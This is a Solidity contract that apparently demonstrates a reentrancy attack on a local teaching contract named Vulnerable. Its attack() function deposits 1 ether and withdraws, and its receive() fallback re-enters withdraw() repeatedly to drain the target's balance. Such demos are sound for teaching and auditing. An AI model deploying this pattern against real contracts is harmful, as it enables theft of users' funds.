// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "./Vulnerable.sol";

contract Attack {
    Vulnerable public vulnerable;  //object of type vulnerable

    constructor(address vulnerableAddress){
        vulnerable = Vulnerable(vulnerableAddress);
    }

    function attack() external payable{
        vulnerable.deposit{value:1 ether}();
        vulnerable.withdraw();
    }

    receive() external payable{
        if(address(vulnerable).balance >= 1 ether){
            vulnerable.withdraw();
        }
    }

     function callerCheck() public view returns(address,address){
        return vulnerable.callerAddress();
    }


}